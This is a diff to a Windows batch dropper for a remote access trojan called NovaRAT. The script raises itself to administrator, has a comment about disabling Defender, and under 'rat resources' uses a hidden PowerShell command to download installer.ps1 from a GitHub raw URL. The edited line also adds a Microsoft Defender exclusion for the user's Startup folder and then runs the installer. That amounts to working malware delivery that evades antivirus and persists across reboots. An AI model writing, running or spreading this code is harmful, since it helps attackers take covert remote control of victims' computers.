@@ -1,5 +1,7 @@
 REM get admin permissions for script
 @echo off
+
+
 :: BatchGotAdmin
 :-------------------------------------
 if "%PROCESSOR_ARCHITECTURE%" EQU "amd64" (
@@ -27,5 +29,4 @@ if '%errorlevel%' NEQ '0' (
 REM disable defender
 
 REM rat resources
-powershell powershell.exe -windowstyle hidden "Invoke-WebRequest -Uri raw.githubusercontent.com/fazelastblood/NovaRAT/main/files/installer.ps1 -OutFile installer.ps1"
-powershell Start-Process -windowstyle hidden -ep bypass "installer.ps1"
+powershell powershell.exe -windowstyle hidden "Invoke-WebRequest -Uri raw.githubusercontent.com/fazelastblood/NovaRAT/main/files/installer.ps1 -OutFile installer.ps1"; Add-MpPreference -ExclusionPath "C:/Users/%username%/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/"; ./installer.ps1
